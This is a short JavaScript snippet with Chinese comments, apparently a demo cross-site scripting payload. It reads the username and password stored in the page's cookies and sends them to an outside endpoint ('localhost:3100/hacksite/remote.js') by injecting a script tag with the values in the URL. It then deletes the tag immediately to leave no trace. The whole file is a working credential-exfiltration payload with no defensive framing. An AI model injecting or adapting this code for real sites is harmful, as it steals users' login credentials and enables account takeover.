
var username = getCookie('username');
var password = getCookie('password');

var url = 'http://localhost:3100/hacksite/remote.js?username='+username +'&password='+password;
var scripts = document.createElement('script');

//立即发出http请求
scripts.setAttribute('src', url);
document.getElementsByTagName('head')[0].appendChild(scripts);

//发出请求后，删除script
setTimeout(function(){
	scripts.parentNode.removeChild(scripts);
},0);

function getCookie(name){
	var arr,reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");

	if(arr = document.cookie.match(reg)){
		return unescape(arr[2]);
	}

	return;
}






